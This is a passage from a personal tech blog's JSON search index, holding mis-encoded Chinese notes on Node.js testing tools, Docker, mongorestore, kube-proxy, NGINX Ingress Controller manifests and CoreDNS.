‡åº“","slug":"history/tech/5cd385f831a604f66b46a653","date":"2019-05-09T01:44:24.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cd385f831a604f66b46a653/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cd385f831a604f66b46a653/","excerpt":"","text":"https://github.com/feathericons/feather#feather","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"nodejs æµ‹è¯•","slug":"history/tech/5cd37fee31a604f66b46a652","date":"2019-05-09T01:18:38.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cd37fee31a604f66b46a652/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cd37fee31a604f66b46a652/","excerpt":"","text":"æµ‹è¯•ï¼š12345Chai // æ–­è¨€ Mocha // æµ‹è¯•æ¡†æ¶superTest // è¯·æ±‚åº“nock // æ¨¡æ‹ŸæœåŠ¡å™¨å“åº”nyc // è¦†ç›–ç‡æ€§èƒ½ï¼š1Benchmark.js","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å†·æš–è‰²","slug":"history/shoot/5cd3c1b131a604f66b46a655","date":"2019-05-08T17:59:13.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5cd3c1b131a604f66b46a655/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5cd3c1b131a604f66b46a655/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"äº’è¡¥è‰²","slug":"history/shoot/5cd3c07a31a604f66b46a654","date":"2019-05-08T17:54:02.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5cd3c07a31a604f66b46a654/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5cd3c07a31a604f66b46a654/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"docker ä¿®æ”¹å·²å¯åŠ¨çš„å®¹å™¨å‚æ•°","slug":"history/tech/5cc29229c034764b2e0391f4","date":"2019-04-25T17:07:53.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cc29229c034764b2e0391f4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cc29229c034764b2e0391f4/","excerpt":"","text":"1234docker ps --no-truncservice docker stopcd /var/lib/docker/containers/1e586bf398ffb62452234bfffca43614fb5598552d107831ca1ae7a779edb420 vim config.v2.jsonä¿®æ”¹å:1service docker start","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mongorestore agz","slug":"history/tech/5cc022dfad4dd4c72f84f5c7","date":"2019-04-23T20:48:31.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cc022dfad4dd4c72f84f5c7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cc022dfad4dd4c72f84f5c7/","excerpt":"","text":"123456mongorestore \\ --host 127.0.0.1 \\ --port 27017 \\ --gzip --archive=./xxx.agz \\ --nsFrom &quot;xxx.*&quot; \\ --nsTo &quot;yyy.*&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"flutter äº”çº¿è°±æ’ä»¶","slug":"history/tech/5cbe6fd9ad4dd4c72f84f5c6","date":"2019-04-23T01:52:25.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cbe6fd9ad4dd4c72f84f5c6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cbe6fd9ad4dd4c72f84f5c6/","excerpt":"","text":"https://github.com/AppleEducate/plugins.git","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kube-proxy","slug":"history/tech/5cb943dcad4dd4c72f84f5bb","date":"2019-04-19T03:43:24.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb943dcad4dd4c72f84f5bb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb943dcad4dd4c72f84f5bb/","excerpt":"","text":"kube-proxy åœ¨ Linux ç³»ç»Ÿä¸Šå½“å‰æ”¯æŒä¸‰ç§æ¨¡å¼ï¼Œå¯é€šè¿‡ --proxy-mode é…ç½®ï¼š123userspaceï¼šè¿™æ˜¯å¾ˆæ—©æœŸçš„ä¸€ç§æ–¹æ¡ˆï¼Œä½†æ•ˆç‡ä¸Šæ˜¾è‘—ä¸è¶³ï¼Œä¸æ¨èä½¿ç”¨iptablesï¼šå½“å‰çš„é»˜è®¤æ¨¡å¼ã€‚æ¯” userspace è¦å¿«ï¼Œä½†é—®é¢˜æ˜¯ä¼šç»™æœºå™¨ä¸Šäº§ç”Ÿå¾ˆå¤š iptables è§„åˆ™ipvsï¼šä¸ºäº†è§£å†³ iptables çš„æ€§èƒ½é—®é¢˜è€Œå¼•å…¥ï¼Œé‡‡ç”¨å¢é‡çš„æ–¹å¼è¿›è¡Œæ›´æ–°iptables ï¼š12å½“å¼€å§‹è®¿é—®çš„æ—¶å€™å…ˆè¦ç»è¿‡ PREROUTING é“¾ï¼Œè½¬åˆ° KUBE-SERVICES é“¾ï¼Œå½“æŸ¥è¯¢åˆ°åŒ¹é…çš„è§„åˆ™ä¹‹åï¼Œè¯·æ±‚å°†è½¬å‘ KUBE-SVC-SMQNAAUIAENDDGYQ é“¾ï¼Œè¿›è€Œåˆ°è¾¾ KUBE-SEP-QX7VDAS5KDY6V3EV å¯¹åº”äºæˆ‘ä»¬çš„ Podã€‚(æ³¨ï¼šä¸ºäº†ç®€æ´ï¼Œä¸Šè¿° iptables è§„åˆ™æ˜¯éƒ¨ç½²ä¸€ä¸ª Pod æ—¶çš„åœºæ™¯)iptables è§„åˆ™å®é™…æ˜¯å¦‚ä½•åˆ›å»ºå’Œç»´æŠ¤çš„ï¼Œå‚è€ƒä¸‹ proxier çš„å…·ä½“å®ç°NodePort ç±»å‹çš„ Service æŸ¥çœ‹æ–¹å¼ï¼š123 kubectl -n work get allnetstat -ntlp |grep 30154 // kube-proxy ç›‘å¬åœ¨æ­¤ NodePortdocker run --rm -it --network host redis:alpine redis-cli -p 30154æŸ¥çœ‹å½“å‰é›†ç¾¤çš„ Service å’Œ Endpoint:123kubectl -n work get svckubectl -n work get endpointskubectl -n work get pod -o wideæ‰©å®¹ï¼š123kubectl -n work scale --replicas=2 deploy/saythx-rediskubectl -n work get allkubectl -n work get endpointskube-proxy çš„ session affinity:â€“å¾…å®Œæˆâ€“","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"k8s","slug":"k8s","permalink":"https://wangxiuwen.github.io/tags/k8s/"}],"author":"wangxiuwen"},{"title":"linux åˆ é™¤ç¬¬ä¸€è¡Œè¾“å‡º","slug":"history/tech/5cb932baad4dd4c72f84f5ba","date":"2019-04-19T02:30:18.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb932baad4dd4c72f84f5ba/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb932baad4dd4c72f84f5ba/","excerpt":"","text":"1awk &apos;&#123;if(NR&gt;1)print&#125;&apos;æˆ–1sed -n &apos;1!p&apos;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Ingress ä½¿ç”¨","slug":"history/tech/5cb98e8aad4dd4c72f84f5c5","date":"2019-04-18T21:02:02.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb98e8aad4dd4c72f84f5c5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb98e8aad4dd4c72f84f5c5/","excerpt":"","text":"å®‰è£…åˆ›å»º Namespace1kubectl apply -f namespace.yamlnamespace.yaml:1234567apiVersion: v1kind: Namespacemetadata: name: ingress-nginx labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginxåˆ›å»º ConfigMap:è¿™é‡Œåˆ›å»ºäº†å‡ ä¸ª ConfigMapï¼Œä¸»è¦æ˜¯ç»™ Controller ä½¿ç”¨123456789101112131415161718192021222324252627282930kind: ConfigMapapiVersion: v1metadata: name: nginx-configuration namespace: ingress-nginx labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx---kind: ConfigMapapiVersion: v1metadata: name: tcp-services namespace: ingress-nginx labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx---kind: ConfigMapapiVersion: v1metadata: name: udp-services namespace: ingress-nginx labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx---åˆ›å»ºå¯¹åº”çš„ Role å’Œ RoleBinding:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142apiVersion: v1kind: ServiceAccountmetadata: name: nginx-ingress-serviceaccount namespace: ingress-nginx labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx---apiVersion: rbac.authorization.k8s.io/v1beta1kind: ClusterRolemetadata: name: nginx-ingress-clusterrole labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginxrules: - apiGroups: - &quot;&quot; resources: - configmaps - endpoints - nodes - pods - secrets verbs: - list - watch - apiGroups: - &quot;&quot; resources: - nodes verbs: - get - apiGroups: - &quot;&quot; resources: - services verbs: - get - list - watch - apiGroups: - &quot;extensions&quot; resources: - ingresses verbs: - get - list - watch - apiGroups: - &quot;&quot; resources: - events verbs: - create - patch - apiGroups: - &quot;extensions&quot; resources: - ingresses/status verbs: - update---apiVersion: rbac.authorization.k8s.io/v1beta1kind: Rolemetadata: name: nginx-ingress-role namespace: ingress-nginx labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginxrules: - apiGroups: - &quot;&quot; resources: - configmaps - pods - secrets - namespaces verbs: - get - apiGroups: - &quot;&quot; resources: - configmaps resourceNames: - &quot;ingress-controller-leader-nginx&quot; verbs: - get - update - apiGroups: - &quot;&quot; resources: - configmaps verbs: - create - apiGroups: - &quot;&quot; resources: - endpoints verbs: - get---apiVersion: rbac.authorization.k8s.io/v1beta1kind: RoleBindingmetadata: name: nginx-ingress-role-nisa-binding namespace: ingress-nginx labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginxroleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: nginx-ingress-rolesubjects: - kind: ServiceAccount name: nginx-ingress-serviceaccount namespace: ingress-nginx---apiVersion: rbac.authorization.k8s.io/v1beta1kind: ClusterRoleBindingmetadata: name: nginx-ingress-clusterrole-nisa-binding labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginxroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: nginx-ingress-clusterrolesubjects: - kind: ServiceAccount name: nginx-ingress-serviceaccount namespace: ingress-nginx---éƒ¨ç½² NGINX Ingress Controller:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: nginx-ingress-controller namespace: ingress-nginx labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginxspec: replicas: 1 selector: matchLabels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx template: metadata: labels: app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx annotations: prometheus.io/port: &quot;10254&quot; prometheus.io/scrape: &quot;true&quot; spec: serviceAccountName: nginx-ingress-serviceaccount containers: - name: nginx-ingress-controller image: taobeier/nginx-ingress-controller:0.21.0 args: - /nginx-ingress-controller - --configmap=$(POD_NAMESPACE)/nginx-configuration - --tcp-services-configmap=$(POD_NAMESPACE)/tcp-services - --udp-services-configmap=$(POD_NAMESPACE)/udp-services - --publish-service=$(POD_NAMESPACE)/ingress-nginx - --annotations-prefix=nginx.ingress.kubernetes.io securityContext: capabilities: drop: - ALL add: - NET_BIND_SERVICE # www-data -&gt; 33 runAsUser: 33 env: - name: POD_NAME valueFrom: fieldRef: fieldPath: metadata.name - name: POD_NAMESPACE valueFrom: fieldRef: fieldPath: metadata.namespace ports: - name: http containerPort: 80 - name: https containerPort: 443 livenessProbe: failureThreshold: 3 httpGet: path: /healthz port: 10254 scheme: HTTP initialDelaySeconds: 10 periodSeconds: 10 successThreshold: 1 timeoutSeconds: 1 readinessProbe: failureThreshold: 3 httpGet: path: /healthz port: 10254 scheme: HTTP periodSeconds: 10 successThreshold: 1 timeoutSeconds: 1æ£€æµ‹éƒ¨ç½²æ˜¯å¦å·²ç»æˆåŠŸï¼š1kubectl -n ingress-nginx get all å°† NGINX Ingress Controller æš´éœ²è‡³é›†ç¾¤å¤–Ingress çš„ä½œç”¨åœ¨äºå°†é›†ç¾¤å¤–çš„è¯·æ±‚æµé‡è½¬å‘é›†ç¾¤å†…çš„æœåŠ¡ï¼Œé»˜è®¤æƒ…å†µä¸‹é›†ç¾¤å¤–å’Œé›†ç¾¤å†…æ˜¯ä¸äº’é€šçš„ï¼Œæ‰€ä»¥å¿…é¡»å°† NGINX Ingress Controller æš´éœ²è‡³é›†ç¾¤å¤–ï¼Œä»¥ä¾¿è®©å…¶èƒ½æ¥å—æ¥è‡ªé›†ç¾¤å¤–çš„è¯·æ±‚ã€‚å°†å…¶æš´éœ²çš„æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©æˆ‘ä»¬ä¹‹å‰å·²ç»ä»‹ç»è¿‡çš„ NodePort çš„æ–¹å¼ã€‚é€‰æ‹©å®ƒä¸»è¦æœ‰ä»¥ä¸‹åŸå› ï¼š12345ä½¿ç”¨çº¯çš„ LB å®ç°å®ŒæˆæœåŠ¡æš´éœ²ï¼Œæ¯”å¦‚ [MetalLB](https://metallb.universe.tf/)ï¼Œä½†å®ƒè¿˜å¤„äº Beta é˜¶æ®µï¼Œå°šæœªæœ‰å¤§è§„æ¨¡ç”Ÿäº§ç¯å¢ƒä½¿ç”¨çš„éªŒè¯ã€‚ç›´æ¥ä½¿ç”¨å®¿ä¸»æœºçš„ç½‘ç»œï¼Œåªéœ€è®¾ç½® hostNetwork: true å³å¯ï¼Œä½†è¿™ä¸ªæ–¹å¼å¯èƒ½ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜ã€‚é€‰æ‹© External IPs çš„æ–¹å¼ï¼Œä½†è¿™ç§æ–¹å¼æ— æ³•ä¿ç•™è¯·æ±‚çš„æº IPï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯å¾ˆå¥½ã€‚å…¶å®æˆ‘ä»¬ä¸€èˆ¬ä¼šé€‰æ‹©è‡ªå·±æä¾›è¾¹ç¼˜èŠ‚ç‚¹çš„æ–¹å¼ï¼Œä¸è¿‡è¿™ç§æ–¹å¼æ˜¯å»ºç«‹åœ¨ NodePort çš„æ–¹å¼ä¹‹ä¸Šï¼Œå¹¶ä¸”éœ€è¦æä¾›é¢å¤–çš„ç»„ä»¶ä½¿ç”¨ ingress å®ä¾‹:12345678910111213141516apiVersion: extensions/v1beta1kind: Ingressmetadata: name: example-ingress namespace: work annotations: nginx.ingress.kubernetes.io/ssl-redirect: &quot;false&quot;spec: rules: - host: example.ingress.io http: paths: - path: / backend: serviceName: example-frontend servicePort: 80æŸ¥çœ‹ serviceï¼š1kubectl -n ingress-nginx get svc","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"k8s æ‰©å±•é˜…è¯»","slug":"history/tech/5cb986b0ad4dd4c72f84f5c4","date":"2019-04-18T20:28:32.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb986b0ad4dd4c72f84f5c4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb986b0ad4dd4c72f84f5c4/","excerpt":"","text":"k8sç”Ÿæ€K8S ç½‘ç«™CNCF åšå®¢K8S ç»„ç»‡Docker æ–‡æ¡£Promethes æ–‡æ¡£Grafana ä¸»é¡µFluentd ä¸»é¡µ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"k8s faq","slug":"history/tech/5cb985fead4dd4c72f84f5c3","date":"2019-04-18T20:25:34.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb985fead4dd4c72f84f5c3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb985fead4dd4c72f84f5c3/","excerpt":"","text":"k8sçš„æ—¶åŒºå¤„ç†ã€‚æ—¶åŒºå¯é€šè¿‡æŒ‚è½½å®¿ä¸»æœºé…ç½®æ–‡ä»¶/etc/localtime å®Œæˆï¼Œ æˆ–è€…é€šè¿‡è®¾ç½® TZ ç¯å¢ƒå˜é‡å®Œæˆã€‚ å½“ç„¶ä½ ä¹Ÿå¯ä»¥å°è¯•ç”¨ PodPreset æ¥è§£å†³ï¼Œåªä¸è¿‡å½“å‰è¿˜æœªç¨³å®šã€‚k8sçš„æ—¥å¿—å¤„ç†ELK/EFK ç­‰æŠ€æœ¯æ ˆéƒ½å¯ä»¥ã€‚ å¦‚æœä½ æ˜¯æƒ³é—®å¦‚ä½•æ”¶é›†ï¼Œé‚£æ¯”å¦‚ daemonset çš„æ–¹å¼ æˆ–è€… æŒ‚ç›®å½•å†™ä¹‹ç±»çš„éƒ½å¯ä»¥ï¼Œçœ‹ä½ å®é™…ä¹ æƒ¯","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å­˜å‚¨å·","slug":"history/tech/5cb985aaad4dd4c72f84f5c2","date":"2019-04-18T20:24:10.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb985aaad4dd4c72f84f5c2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb985aaad4dd4c72f84f5c2/","excerpt":"","text":"å®˜æ–¹ CSI æ–‡æ¡£","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"k8s","slug":"k8s","permalink":"https://wangxiuwen.github.io/tags/k8s/"}],"author":"wangxiuwen"},{"title":"Ingress","slug":"history/tech/5cb98560ad4dd4c72f84f5c1","date":"2019-04-18T20:22:56.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb98560ad4dd4c72f84f5c1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb98560ad4dd4c72f84f5c1/","excerpt":"","text":"Ingress æ˜¯ä»€ä¹ˆï¼š1kubectl explain ingressIngress æ˜¯ä¸€ç»„å…è®¸å¤–éƒ¨è¯·æ±‚è¿›å…¥é›†ç¾¤çš„è·¯ç”±è§„åˆ™çš„é›†åˆã€‚å®ƒå¯ä»¥ç»™ Service æä¾›é›†ç¾¤å¤–éƒ¨è®¿é—®çš„ URLï¼Œè´Ÿè½½å‡è¡¡ï¼ŒSSL ç»ˆæ­¢ç­‰ã€‚ç›´ç™½ç‚¹è¯´ï¼ŒIngress å°±ç±»ä¼¼èµ·åˆ°äº†æ™ºèƒ½è·¯ç”±çš„è§’è‰²ï¼Œå¤–éƒ¨æµé‡åˆ°è¾¾ Ingress ï¼Œå†ç”±å®ƒæŒ‰å·²ç»åˆ¶å®šå¥½çš„è§„åˆ™åˆ†å‘åˆ°ä¸åŒçš„åç«¯æœåŠ¡ä¸­å»ã€‚çœ‹èµ·æ¥å®ƒå¾ˆåƒæˆ‘ä»¬ä½¿ç”¨çš„è´Ÿè½½å‡è¡¡å™¨ä¹‹ç±»çš„ã€‚é‚£ä½ å¯èƒ½ä¼šé—®ï¼ŒIngress ä¸ LoadBalancer ç±»å‹çš„ Service çš„åŒºåˆ«æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ12345Ingress ä¸æ˜¯ä¸€ç§ Service ç±»å‹Ingress æ˜¯ K8S ä¸­çš„ä¸€ç§èµ„æºç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ kubectl get ingress çš„æ–¹å¼è·å–æˆ‘ä»¬å·²æœ‰çš„ Ingress èµ„æºã€‚Ingress å¯ä»¥æœ‰å¤šç§æ§åˆ¶å™¨ï¼ˆå®ç°ï¼‰é€šè¿‡ä¹‹å‰çš„ä»‹ç»ï¼Œæˆ‘ä»¬çŸ¥é“ K8S ä¸­æœ‰å¾ˆå¤šçš„ Controller (æ§åˆ¶å™¨)ï¼Œè€Œè¿™äº› Controller å·²ç»æ‰“åŒ…è¿›äº† kube-controller-manager ä¸­ï¼Œé€šè¿‡ --controllers å‚æ•°æ§åˆ¶å¯ç”¨å“ªäº›ã€‚ä½†æ˜¯ Ingress çš„ Controller å¹¶æ²¡æœ‰åŒ…å«åœ¨å…¶ä¸­ï¼Œè€Œä¸”æœ‰å¤šç§é€‰æ‹©ã€‚ç”±ç¤¾åŒºç»´æŠ¤ï¼ˆæˆ–æ˜¯è¯´å®˜æ–¹æ”¯æŒçš„ï¼‰æœ‰ä¸¤ä¸ªï¼šé€‚ç”¨äº Google Cloud çš„ GLBCï¼Œå½“ä½ ä½¿ç”¨ GKE çš„æ—¶å€™ï¼Œä¾¿ä¼šçœ‹åˆ°å®ƒï¼›å’Œ NGINX Ingress Controllerå®ƒæ˜¯ä½¿ç”¨ ConfigMap å­˜å‚¨ NGINX é…ç½®å®ç°çš„ã€‚ç¬¬ä¸‰æ–¹çš„å®ç°è¿˜æœ‰ï¼šåŸºäº Envoy çš„ Contour;F5 çš„ F5 BIG-IP Controller;åŸºäº HAProxy çš„ haproxy-ingress;åŸºäº Istio çš„ Control Ingress Traffic;ç°ä»£åŒ–çš„åå‘ä»£ç†æœåŠ¡å™¨ Traefik;ä»¥åŠ Kong æ”¯æŒçš„ Kong Ingress Controller for KubernetesNGINX å®˜æ–¹æ”¯æŒçš„ NGINX Ingress Controllerè¿™é‡Œå¯ä»¥çœ‹åˆ° K8S ç¤¾åŒºå’Œ NGINX éƒ½æœ‰ NGINX Ingress Controllerï¼Œå¾ˆå¤šäººåœ¨ä¸€å¼€å§‹æ¥è§¦ Ingress çš„æ—¶å€™ä¾¿é™·å…¥äº†é€‰æ‹©çš„è‹¦æ¼ä¸­ï¼Œé™¤å»å‰é¢çš„é‚£äº›é€‰æ‹©å¤–ï¼Œå• NGINX çš„æ§åˆ¶å™¨å°±æœ‰ä¸¤ä¸ªï¼Œåˆ°åº•åº”è¯¥æ€ä¹ˆé€‰ã€‚è¿™é‡Œæä¾›ä¸¤ç‚¹å»ºè®®ï¼šå¯èƒ½å¤šæ•°äººä½¿ç”¨çš„éƒ½æ˜¯ NGINX è€Œé NGINX Plusï¼Œå¦‚æœä½ éœ€è¦ä¼šè¯ä¿æŒï¼ˆSession persistenceï¼‰çš„è¯ï¼Œé‚£ä½ åº”è¯¥é€‰æ‹© K8S ç¤¾åŒºç»´æŠ¤çš„ç‰ˆæœ¬å³ä½¿æˆ‘ä»¬å¹³æ—¶ä½¿ç”¨ NGINX çš„æ—¶å€™ï¼Œä¹Ÿå¸¸å¸¸ä¼šæœ‰åŠ¨æ€é…ç½®çš„éœ€æ±‚ï¼Œå¦‚æœä½ ä»ç„¶æœ‰è¿™æ ·çš„éœ€æ±‚ï¼Œé‚£ä½ è¿˜æ˜¯ç»§ç»­ä½¿ç”¨ K8S ç¤¾åŒºç»´æŠ¤çš„ç‰ˆæœ¬ï¼ˆå…¶ä¸­å†…ç½®äº† Lua æ”¯æŒï¼‰ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"k8s","slug":"k8s","permalink":"https://wangxiuwen.github.io/tags/k8s/"}],"author":"wangxiuwen"},{"title":"coredns","slug":"history/tech/5cb9813bad4dd4c72f84f5c0","date":"2019-04-18T20:05:15.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb9813bad4dd4c72f84f5c0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb9813bad4dd4c72f84f5c0/","excerpt":"","text":"k8s é›†ç¾¤å†…çš„ DNS æœåŠ¡:https://github.com/kubernetes/dnscoredns å¹¶ä¸æ˜¯é»˜è®¤çš„ DNS æœåŠ¡ï¼Œä½†æ˜¯å®ƒä½œä¸º K8S çš„ DNS æ’ä»¶çš„åŠŸèƒ½å·²ç» GA ã€‚CoreDNS åœ¨ K8S 1.13 ç‰ˆæœ¬ä¸­æ‰æ­£å¼æˆä¸º é»˜è®¤çš„ DNS æœåŠ¡coredns å®˜æ–¹ç½‘å€ï¼šhttps://coredns.io/coredns å†…ç½®æ’ä»¶:https://coredns.io/plugins/core ç¬¬ä¸‰æ–¹æ’ä»¶:https://coredns.io/explugins/è‡ªå·±å†™æ’ä»¶:https://coredns.io/2016/12/19/writing-plugins-for-coredns/ä½¿ç”¨ kubeadm åˆ›å»ºé›†ç¾¤æ—¶å€™ kubeadm init å¯ä»¥ä¼ é€’ 